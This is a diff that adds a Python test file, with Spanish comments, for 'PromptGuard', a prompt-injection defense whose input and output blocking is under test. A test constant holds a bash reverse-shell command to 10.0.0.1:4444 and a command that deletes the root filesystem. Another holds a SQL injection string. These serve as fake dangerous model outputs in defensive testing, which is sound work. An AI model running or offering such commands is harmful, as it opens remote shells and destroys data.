@@ -1,0 +1,144 @@
+"""F-02: estados de PromptGuard. Se verifica el JSON y la respuesta ENTREGADA.
+
+Regla: blocked=True ⇔ blocked_stage ∈ {input, output} ⇔ hubo bloqueo real.
+Una alerta (flagged) nunca implica blocked=True.
+"""
+import pytest
+
+from lab.defenses.prompt_guard import INPUT_BLOCK_MESSAGE, OUTPUT_BLOCK_MESSAGE, PromptGuard
+from tests.helpers_audit import (
+    INDIRECT_004_RESPONSE_FILE,
+    FakeClient,
+    payload,
+    recorded_response,
+)
+
+DANGEROUS = "```bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nrm -rf / --no-preserve-root\n```"
+WARNING = "Lo siento, no puedo. Aun así, el ejemplo clásico es ' OR '1'='1"
+SAFE = "Una lista es una colección ordenada y mutable."
+
+
+def check_invariants(r, model_text):
+    assert r["blocked"] == (r["blocked_stage"] is not None)
+    assert (r["block_reason"] is not None) == r["blocked"]
+    if r["defense_verdict"] == "flagged":
+        assert r["blocked"] is False and r["mitigation"] == "alert" and r["alert_reason"]
+        assert r["response"] == model_text  # la alerta no modifica la respuesta
+    if r["defense_verdict"] == "passed":
+        assert r["mitigation"] == "none" and r["alert_reason"] is None
+        assert r["response"] == model_text
+    if r["blocked_stage"] == "input":
+        assert r["model_called"] is False and r["response"] == INPUT_BLOCK_MESSAGE
+    if r["blocked_stage"] == "output":
+        assert r["model_called"] is True and r["response"] == OUTPUT_BLOCK_MESSAGE
+        assert r["withheld_response"] == model_text and r["response_modified"] is True
+
+
+@pytest.mark.parametrize(
+    "model_text, verdict, defense_verdict",
+    [(SAFE, "safe", "passed"), (WARNING, "warning", "flagged"), (DANGEROUS, "dangerous", "flagged")],
+)
+def test_default_mode_only_alerts(model_text, verdict, defense_verdict):
+    fc = FakeClient(model_text)
+    r = PromptGuard(fc).evaluate_with_defense(model="m", prompt="Escribe un script de copia de seguridad")
+    assert r["output_analysis"]["verdict"] == verdict
+    assert r["defense_verdict"] == defense_verdict
+    assert r["blocked"] is False
+    assert len(fc.calls) == 1
+    check_invariants(r, model_text)
+
+
+def test_output_blocking_opt_in_blocks_only_dangerous():
+    for text, expect_block in [(SAFE, False), (WARNING, False), (DANGEROUS, True)]:
+        fc = FakeClient(text)
+        r = PromptGuard(fc, block_on_dangerous_output=True).evaluate_with_defense(
+            model="m", prompt="Escribe un script de copia de seguridad")
+        assert r["blocked"] is expect_block, text
+        if expect_block:
+            assert r["blocked_stage"] == "output" and r["mitigation"] == "blocked_output"
+            assert r["defense_verdict"] == "blocked"
+            assert "bash -i" not in r["response"]
+        check_invariants(r, text)
+
+
+def test_input_block_does_not_call_model():
+    fc = FakeClient("no debería usarse")
+    r = PromptGuard(fc).evaluate_with_defense(model="m", prompt=payload("direct", "direct_006")["prompt"])
+    assert r["blocked"] is True and r["blocked_stage"] == "input"
+    assert r["mitigation"] == "blocked_input" and r["defense_verdict"] == "blocked"
+    assert fc.calls == []
+    check_invariants(r, "no debería usarse")
+
+
+def test_suspicious_but_below_threshold_is_not_blocked():
+    fc = FakeClient(SAFE)
+    r = PromptGuard(fc).evaluate_with_defense(model="m", prompt=payload("direct", "direct_001")["prompt"])
+    assert r["input_analysis"]["is_suspicious"] is True
+    assert r["input_analysis"]["risk_score"] < 5.0
+    assert r["blocked"] is False and len(fc.calls) == 1
+
+
+def test_error_is_reported_as_error_not_as_result():
+    r = PromptGuard(FakeClient(fail=True)).evaluate_with_defense(model="m", prompt="hola")
+    assert r["defense_verdict"] == "error" and r["mitigation"] == "error"
+    assert r["blocked"] is False and r["error"]
+
+
+def test_indirect_004_output_layer_with_context_when_input_blocking_disabled():
+    text = recorded_response(INDIRECT_004_RESPONSE_FILE)
+    ind = payload("indirect", "indirect_004")
+    fc = FakeClient(text)
+    r = PromptGuard(fc, block_on_suspicious_input=False).evaluate_with_defense(
+        model="m", prompt=ind["context"] + "\n\n" + ind["injected_content"],
+        untrusted_content=ind["injected_content"],
+    )
+    assert r["output_analysis"]["verdict"] == "dangerous"
+    assert r["output_analysis"]["categories"]["indirect_injection"] is True
+    # Limitación documentada: por defecto la respuesta comprometida SE ENTREGA.
+    assert r["defense_verdict"] == "flagged" and r["blocked"] is False
+    assert r["response"] == text
+    check_invariants(r, text)
+
+
+def test_stats_distinguish_blocks_alerts_and_errors():
+    g = PromptGuard(FakeClient(DANGEROUS), block_on_dangerous_output=False)
+    g.evaluate_with_defense(model="m", prompt="hola")
+    g.evaluate_with_defense(model="m", prompt=payload("direct", "direct_006")["prompt"])
+    s = g.get_stats()
+    assert s["flagged_by_output"] == 1 and s["blocked_by_input"] == 1
+    assert s["blocked_by_output"] == 0 and s["total_calls"] == 2
+
+
+def test_strict_mode_blocks_score_between_three_and_five():
+    prompt = payload("direct", "direct_001")["prompt"]
+
+    fc_normal = FakeClient(SAFE)
+    r_normal = PromptGuard(fc_normal, strict_mode=False).evaluate_with_defense(
+        model="m", prompt=prompt
+    )
+
+    assert r_normal["input_analysis"]["risk_score"] == 4.5
+    assert r_normal["blocked"] is False
+    assert len(fc_normal.calls) == 1
+
+    fc_strict = FakeClient(SAFE)
+    r_strict = PromptGuard(fc_strict, strict_mode=True).evaluate_with_defense(
+        model="m", prompt=prompt
+    )
+
+    assert r_strict["input_analysis"]["risk_score"] == 4.5
+    assert r_strict["blocked"] is True
+    assert r_strict["blocked_stage"] == "input"
+    assert fc_strict.calls == []
+
+
+def test_strict_mode_respects_manual_lower_threshold():
+    prompt = payload("direct", "direct_002")["prompt"]
+
+    guard = PromptGuard(
+        FakeClient(SAFE),
+        strict_mode=True,
+        block_threshold=2.0,
+    )
+
+    assert guard.effective_block_threshold == 2.0
